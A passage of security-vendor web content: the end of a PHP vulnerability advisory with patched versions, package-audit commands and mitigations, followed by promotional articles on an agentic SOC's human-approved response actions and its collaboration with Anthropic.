Rebuild container images from patched upstream bases. Patching only the running containers leaves the image exposed.

Move end-of-life PHP to a supported branch.

Record the patched version, vendor advisory, restart time, and validation evidence for each host or image. If a workload can’t be patched right away, document compensating controls and an approved exception with an expiry date.

Patched versions

PHP branch

Support status

Patched version

Action

8.5

Active support

8.5.12

Update immediately

8.4

Active support

8.4.27

Update immediately

8.3

Security fixes only

8.3.36

Update immediately

8.2

Security fixes only

8.2.35

Update immediately, then plan an upgrade

8.1 and older

End-of-life

None from the PHP project

Upgrade or get fixes from your vendor

The PHP project no longer releases updates for 8.1 or older. Some distributions and long-term support (LTS) vendors provide backported fixes, so check with your vendor.

Audit commands

Use these commands to find PHP packages and confirm that your vendor backported both fixes.

Platform

Command

Ubuntu or Debian

dpkg -l | grep php

Ubuntu or Debian

apt changelog php8.3-cli | grep -E “CVE-2026-109618|CVE-2026-109619”

RHEL, Rocky Linux, AlmaLinux, or CentOS

rpm -qa | grep php

RHEL, Rocky Linux, or AlmaLinux

rpm -q php-cli –changelog | grep -E “CVE-2026-109618|CVE-2026-109619”

Alpine containers

apk info | grep php

Use stopgaps to reduce exposure while you patch

Configuration changes such as memory_limit or session.upload_progress.enabled are not remediation. PHP states that only an update is a complete solution. The required fix is a patched PHP runtime or a vendor package that explicitly backports both fixes.

If you can’t update right away, PHP lists measures that reduce exposure to specific attack paths. These measures do not make an installation safe.

For CVE-2026-109618

Set memory_limit=-1 in a way applications can’t override, such as php_admin_value in the FPM pool or Apache configuration.

Set a low post_max_size. PHP suggests 8M for applications without uploads and 32M for those with uploads. Keep upload_max_filesize below it.

Enforce request size, field count, and header limits at the web server or proxy.

Skip RLIMIT_AS and RLIMIT_DATA because they can trigger the vulnerable allocation failure.

For CVE-2026-109619

Set session.upload_progress.enabled=0 in php.ini or in an FPM pool or server configuration that applies before request parsing. Then restart every worker. This blocks the confirmed session paths but not other variants.

On PHP 8.5, set fatal_error_backtraces=0 and restart every worker.

Fix attacker-reachable fatal errors and execution timeouts.

How Arctic Wolf Labs turns telemetry into outcomes

Arctic Wolf Labs is our threat intelligence and research team. Global SOC telemetry visibility drives a shared defense, while active network monitoring gives Labs an early warning system across our global customer base. Using telemetry from across the Arctic Wolf customer community, researchers identify spikes in scanning activity, analyze exploitation attempts, and uncover attacker payloads associated with PHP2Shell. We use those findings to develop and fine-tune detections to respond to malicious activity faster. This means customers gain coverage against PHP2Shell activity they may have not observed yet in their unique environment.

Labs researchers also replicate attacker techniques against PHP2Shell vulnerabilities in controlled environments. Arctic Wolf Labs leverages resulting artifacts from these simulations, as well as observed exploit techniques, attacker tradecraft, and emerging indicators of attack/compromise (IOA/IOC), to develop new detections, threat hunt queries, and inform customer remediation guidance

As threat behavior evolves, we continuously apply the latest intelligence across customer environments. Arctic Wolf Labs’ initial investigation has identified numerous scanning efforts as well as malicious exploitation attempts, including passing wget requests to retrieve both ELF and Golang binaries associated with commodity malware.

How the Aurora Superintelligence Platform keeps customers protected

The Aurora Superintelligence Platform helps organizations reduce PHP2Shell risk before and after exploitation. Aurora Vulnerability Management identifies and prioritizes affected assets using live exploit activity and threat intelligence, helping security teams focus remediation efforts where risk is highest.

PHP2Shell vulnerability detections in Aurora Vulnerability Management

The Aurora Agentic SOC monitors the behaviors attackers rely on after exploitation, including webshell deployment, suspicious processes spawned by PHP or web servers, malicious command execution, persistence activity, and lateral movement.

Together, these capabilities help organizations quickly identify exposed systems, prioritize remediation, detect malicious activity, investigate potential compromise, and contain threats while vulnerable systems are being patched. As the threat evolves, Arctic Wolf continuously incorporates new intelligence across the platform to strengthen proactive cyber risk remediation and detection and response capabilities for all customers.

articles.title: Agents Investigate, Humans Decide: How Active Response Works in the Aurora® Agentic SOC
articles.context: When an investigation confirms a real threat, we can stop it with Active Response, a capability of Aurora Managed Detection and Response that works across your email, identity,...
articles.full_text:
Since we launched the Aurora Agentic SOC, we’ve shared a lot about how our AI agents detect, triage, and investigate threats. Response is equally important, because it’s where all of the work in managed detection and response (MDR) pays off for you.

Not every investigation ends in a response action. Some confirm that an alert is harmless, and others wrap up without anything to contain. When an investigation confirms a real threat, we can stop it with Active Response, a capability of Aurora Managed Detection and Response that works across your email, identity, endpoint, and network tools.

In those moments, speed makes a real difference. The faster we contain the account or device an attacker is using, the less time they have to move deeper into your environment. That’s why response in the Aurora Agentic SOC pairs AI agents that investigate at machine speed with a human in the loop analyst who approves every high-impact action.

Response is What Stops an Attack

Detecting an attack doesn’t end it. An attacker who gets into your environment is working toward a goal, such as encrypting your systems, stealing data, or using a compromised mailbox to defraud your customers. That work keeps going until someone cuts off the account, device, or connection the attacker is using.

Most attackers don’t strike the moment they get in. They spend time moving between systems, giving themselves higher levels of access, and copying data first. Each of those steps is a chance to stop them, and Active Response uses that window to cut off the attacker before they reach their goal.

Containing the right account or device early helps keep an attack from turning into data loss or a business outage, so your team can stay focused on running the business. That’s the job of Active Response.

What Active Response Does

Active Response works through integrations with the security and IT tools you already run. It covers four technology types and dozens of first- and third-party tools, all connected through the Open Data Pipeline of our Aurora Superintelligence Platform. Here’s what we can do in each area:

Email: We can delete or quarantine a malicious message and block the sender, which helps stops a phishing campaign before it spreads across your organization.

Identity: We can disable a compromised account, sign the user out of every active session, or force a password reset. Each of these are designed to lock out an attacker who’s trying to use stolen credentials.

Endpoint: We can isolate a laptop or server from the network, quarantine a malicious file, or stop a running process. We do this through the Arctic Wolf Agent, Aurora Endpoint Security, or the endpoint tools you already use.

Network: We can block a malicious IP address at your firewall or web application firewall and block a malicious website at your secure web gateway. That helps keep attacker infrastructure away from your network and your users.

Fast Investigations Make Fast Response Possible

Before we can contain a threat, an investigation has to confirm it’s real, identify which accounts and devices are involved, and work out how the attacker got in. Those answers tell us which response action to take, so the faster they arrive, the faster containment can begin.

In the Aurora Agentic SOC, AI agents do that work. When a detection fires, our Swarm of Experts™ opens a case and assigns it to specialized agents that handle triage, investigation, threat intelligence, and the context of your environment. Instead of one analyst working through each data source in turn, those agents work on the case at the same time. The result is a finished investigation with the evidence, the scope of the threat, and a recommended response action, ready for an analyst to review.

Why Humans Play a Key Role in Active Response

A fast recommendation still needs a careful decision, because response actions can disrupt your business. Disabling an account locks someone out of their work, and isolating a device cuts it off from the rest of the network. If that happens to an executive’s laptop or a business-critical server by mistake, the disruption can be worse than the threat itself.

Crimson Tide is one of my favorite movies, and it’s how I think about the way we run Active Response, because a human has to validate the call before anything high-impact happens. The story takes place on a U.S. nuclear submarine that receives what looks like an order to launch. The captain wants to fire, and the executive officer isn’t convinced. Neither one can launch on his own authority, because the U.S. military requires both officers to agree before it takes its most destructive action.

Response actions aren’t nuclear launches, but the same logic applies. In the Aurora Agentic SOC, high-impact response actions require human approval. When the evidence points to containment, an oversight agent called the Swarm Judge reviews the findings and recommends an action. The case then goes to a human analyst with the evidence attached. That analyst can approve the recommendation, reject it, or ask for more evidence before anything happens.

Our AI Trust Engine™ reinforces that line. It’s the set of guardrails that keeps agents working within the kinds of cases they’ve been tested and validated on. When a case falls outside that experience, or the actions they are approved to take, the agents hand it to a human expert instead of guessing.

Trust Behind Every Response

Trust in a response comes from experience. We run the world’s largest commercial agentic security operations center (SOC) and resolve 200,000 investigations each week, so our agents and analysts have seen how attacks unfold and which actions stop them. More than 1,000 security experts validate our agents’ work every day, and what they learn from each case feeds back into how our agents handle the next one. That experience stands behind every response decision we make for your business.

We don’t keep a human in the loop because our agents lack expertise. No one, agent or person, is right 100% of the time, so the two work together on every high-impact decision. Agents bring the speed to act early, and people bring the extra layer of judgment to act carefully. Agents investigate, humans decide when to use Active Response, and together they help stop attacks before they disrupt your business.

articles.title: Inside Arctic Wolf and Anthropic’s Trust-First Approach to the Agentic SOC
articles.context: Frontline Threats Demand Frontier Protection In recent years, attackers have put AI to work at machine speed, automating reconnaissance, phishing, and exploit development at a...
articles.full_text:
In the recently released 2026 SANS AI in Cybersecurity Survey, nearly two out of three security professionals said they have been given AI-generated guidance that later turned out to be wrong. Not from an experimental tool off in a sandbox, but from systems built into the security stack they were told to rely on. Security teams should not have to live with that. They need to trust the systems that protect them, which is why trust had to be engineered into the foundation of our security operations platform and agentic security operations center (SOC), not bolted on afterward.

Frontline Threats Demand Frontier Protection

In recent years, attackers have put AI to work at machine speed, automating reconnaissance, phishing, and exploit development at a pace human-led security teams were never built to match. Speed doesn’t favor both sides equally. If an attacker’s tool fails, or an AI-generated exploit produces an incorrect result, the cost to the attacker is close to zero. They try again. Defenders do not get that luxury. An AI agent that makes the wrong call inside an organization’s environment, missing a real threat or acting on a false one, can mean damage to that business, and a win for the attacker. An agentic SOC that moves fast but gets it wrong only benefits attackers.

Meeting frontline threats like these takes more than speed. It takes frontier protection, defenses built on AI capable enough to match the attacker and trustworthy enough to be allowed to act.

Why We Chose to Collaborate with Anthropic

That asymmetry is exactly why trust has to be core to what we build, and why we made the decision to collaborate with Anthropic to help us achieve that. Their mission is to ensure the world safely navigates the transition through transformative AI, and for us here at Arctic Wolf, safety and trustworthy AI are inseparable. That alignment, more than any single feature, is why working together made sense from the start.

The first result of that collaboration was the Aurora Security Assistant, which we unveiled at the RSA Conference in 2025. Built in part with Claude models, it gives customers natural language access to security insight uncovered by the Aurora Superintelligence Platform, helping them get faster answers to complex security questions via a simple, chat-based interface.

Delivering Trust and Safety from the World’s Largest Commercial Agentic SOC

Over the last 18 months, our collaboration has only deepened. Anthropic’s Claude models now run throughout the Aurora Superintelligence Platform, including the agents within the Swarm of Experts, the agentic framework that executes key functions of our SOC. That framework now supports thousands of organizations worldwide and performs more than 200,000 security investigations a week, a scale that makes the Aurora Agentic SOC the largest commercial agentic SOC in the world.

This week, at Arctic Wolf’s annual Security Operations Summit, Arctic Wolf shared the stage with Ash Alhashim, Head of Enterprise Cybersecurity GTM, Anthropic, who spoke to just how far this collaboration has come.

“Arctic Wolf’s team knows security operations deeply, and that shows in how they’ve put Claude to work,” he said from the stage. “We’ve learned a lot from working with them and we’re glad to keep building together.”

Today, the Swarm of Experts in the Aurora Agentic SOC resolves more than 60% of its investigations autonomously, with high confidence. That level of unassisted resolution comes from technology we’ve built, leveraging Anthropic’s models as part of the foundation. The same technology has also helped customers resolve cases 26% faster year over year, which means they are not just getting faster answers but better ones. The occurs because Swarm of Experts draws on real investigations across our entire customer base and on each customer’s own unique environment, so the guidance behind every investigation is tailored to their needs.

Our work together also extends to Anthropic’s Cyber Verification Program, which gives vetted security teams access to Anthropic’s most capable models with reduced blocking classifiers for legitimate cyber work. Arctic Wolf is part of the program and has access at the Defense Access tier, which is built for defensive work such as security operations center and incident response tasks. It is another sign of the trust between our teams, and it helps ensure the models behind the Aurora Agentic SOC can support the demands of real defensive work.

A Collaboration That Will Keep Advancing

In under two years, Arctic Wolf and Anthropic have made incredible strides in advancing agentic security operations together. What began as a single AI security assistant has grown into the reasoning layer behind the world’s largest commercial agentic SOC, delivering faster, more accurate outcomes for thousands of customers around the globe each week.

But the best is yet to come. Arctic Wolf and Anthropic will continue to work together to find new ways to build Claude’s capabilities into the Aurora Superintelligence Platform and deliver new innovations, as both the threats and the SOCs built to stop them keep moving at machine speed.
